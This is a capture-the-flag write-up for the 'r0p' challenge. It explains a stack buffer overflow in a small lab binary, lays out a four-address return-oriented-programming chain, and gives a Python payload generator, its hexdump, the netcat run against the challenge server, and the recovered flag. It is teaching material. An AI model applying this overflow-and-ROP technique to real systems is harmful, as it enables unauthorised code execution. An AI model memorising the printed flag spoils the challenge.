# CSAW ALTERNATIVE WRITE UP
by Tilden Jackson (thjackso)

## r0p
The challenge prompt is:
>A vulnerable service is running at shell.hackcenter.dbrumley.com:37203. ROP your way to victory. The binary is also available for analysis in /problems/8ef084c4662a9eb56f99efe899d5729f on the shell server, and for download at [r0p](https://hackcenter.dbrumley.com/problems/b499aee469ea1db0b13465671837e8ea/r0p).

Well this is clearly a return-oriented-programming (ROP) attack. I created a false `./flag` file with some random values in it so that I could run it. If we run `./r0p` this is what we get:

![First Run of ./r0p](https://i.postimg.cc/LXJP3Nh4/firstRun.png)

Lets look at the binary.

The disassembled `<main>` function just sets up a call to `<check_flag>` and then `<vulnerable_function>`. Finally it finishes by writing something to `stdout` using `write`.

![Main Function Assembly](https://i.postimg.cc/j2QSH76d/main.png)

By the function names we will skip over `<check_flag>` and move right to `<vulnerable_function>`.

![Vulnerable Function Assembly](https://i.postimg.cc/2SqfmWqb/vuln.png)

`<vulnerable_function>` uses `read(stdin, char c, 1)` to write into a buffer: `buf[76] //@-0x50(rbp)` on the stack. But the read function can read up to `0x80` bytes of data and only terminates before that if it receives a newline character or there is no more input. We will use that vulnerability to exploit our binary and report the flag to us.

A rough psuedocode looks a little like this:
```
void vulnerable_function(){
	char c; //@-0x51(rbp)
	char buf[0x4c == 76]; //@-0x50(rbp)
	
	for (int i = 0; i <= 0x7f; i++){
		if ((read(0, c, 1) <= 0) || (c == '\n')){
			return;
		}
		buf[i] = c;
	}

}

int main(){
	check_flag();
	vulnerable_function();
	return 0;
}
```
We can easily write into the return address and even farther up the way to chain multiple returns together. The return address is `0x50+0x8 = 0x58` bytes away from the base of the buffer so we can write a total of `(0x80-0x58)/0x8 = 5 addresses` that we can chain together for our ROP attack.

Lets look at the functions in the binary just to get a feel of what we might want to do:
```
┌──(tildenjackson㉿TJ)-[~/hackcenter/csaw-alt]
└─$ cat r0p-dump.asm | grep "<[^>]*>:"
0000000000401000 <_init>:
0000000000401020 <write@plt-0x10>:
0000000000401030 <write@plt>:
0000000000401040 <printf@plt>:
0000000000401050 <lseek@plt>:
0000000000401060 <close@plt>:
0000000000401070 <read@plt>:
0000000000401080 <fflush@plt>:
0000000000401090 <open@plt>:
00000000004010a0 <exit@plt>:
00000000004010b0 <_start>:
00000000004010e0 <_dl_relocate_static_pie>:
00000000004010f0 <deregister_tm_clones>:
0000000000401120 <register_tm_clones>:
0000000000401160 <__do_global_dtors_aux>:
0000000000401190 <frame_dummy>:
0000000000401196 <call_second>:
0000000000401265 <call_first>:
0000000000401305 <vulnerable_function>:
0000000000401380 <die>:
00000000004013a7 <check_flag>:
000000000040145d <main>:
00000000004014a0 <_fini>:
``` 

Well there is `<call_first>` and `<call_second>`, so we can just try to chain those together. This is the call order we will have:
```
1. <call_first>
2. <call_second>
3. <die>
4. replace return address back to main
```
This is within our 5 address limit so we will be fine. 

Here is what our stacks will look like
```
Normally:
| Address relative to rbp  |  value |
-------------------------------------
| +0x08 | <main+35>:     0x401480   | return address 
-------------------------------------
| +0x00 | old(rbp)                  |
------------------------------------- <- rbp
| -0x04 | read() result             |
-------------------------------------
|       |                           |
| -0x50 | buf[0x4c]                 |
|       |                           |
-------------------------------------
| -0x51 | char c                    |
-------------------------------------
| -0x60 |                           |
------------------------------------- <- rsp

Exploit:
| Address relative to rbp | value |
-------------------------------------
| +0x20 | <main+35>:     0x401480   | return address 4 - return to old <main> return address
-------------------------------------
| +0x18 | <die>:         0x401380   | return address 3 - <die>
-------------------------------------
| +0x10 | <call_second>: 0x401196   | return address 2 - <call_second>
------------------------------------- 
| +0x08 | <call_first>:  0x401265   | return address 1 - <call_first>
-------------------------------------
| +0x00 | aaaaaaaa                  | old(rbp)
------------------------------------- <- rbp
| -0x04 | aaaa                      | read() result
-------------------------------------
|       |                           |
| -0x50 | aaaaaaaa...aaaaaaaa       | buf[0x4c]
|       |                           |
-------------------------------------
| -0x51 | char c                    |
-------------------------------------
| -0x60 |                           |
------------------------------------- <- rsp

Note that the addresses are in little endian so 0x401480 looks like: 
80 14 40 00 00 00 00 00
```


Writing a python script to write our exploit to a file we have:
```
#!/usr/bin/env python3
# file: exploit.py
import subprocess
import struct

padding = b"a"*0x58
rops = [0x401265, 0x401196, 0x401380, 0x401480]

print("Writting exploit...")

exploit = padding
print("Added 0x58 padding")
for ret in rops:
    print("Added return 0x{:x}".format(ret))
    exploit += struct.pack("<Q", ret)

exploit += b'\n'

with open("exploit.bin", "wb") as file:
    file.write(exploit)

file.close()
print("Done!\n")
print("Exploit:")
subprocess.run(["hexdump", "exploit.bin"])
```

We run this script to generate our string into `exploit.bin` and then we can report it to the netcat server:
```
┌──(tildenjackson㉿LENOVOLAPTOPTJ)-[~/hackcenter/csaw-alt]
└─$ python3 exploit.py
Writting exploit...
Added 0x58 padding
Added return 0x401265
Added return 0x401196
Added return 0x401380
Added return 0x401480
Done!

Exploit:
0000000 6161 6161 6161 6161 6161 6161 6161 6161
*
0000050 6161 6161 6161 6161 1265 0040 0000 0000
0000060 1196 0040 0000 0000 1380 0040 0000 0000
0000070 1480 0040 0000 0000 000a
0000079

┌──(tildenjackson㉿LENOVOLAPTOPTJ)-[~/hackcenter/csaw-alt]
└─$ cat exploit.bin | nc shell.hackcenter.dbrumley.com 37203
Loading first half of key...
Your key is: 2963a4da8fa9c880029560087a81fca2
```

This worked and we get the flag.
`flag: 2963a4da8fa9c880029560087a81fca2`
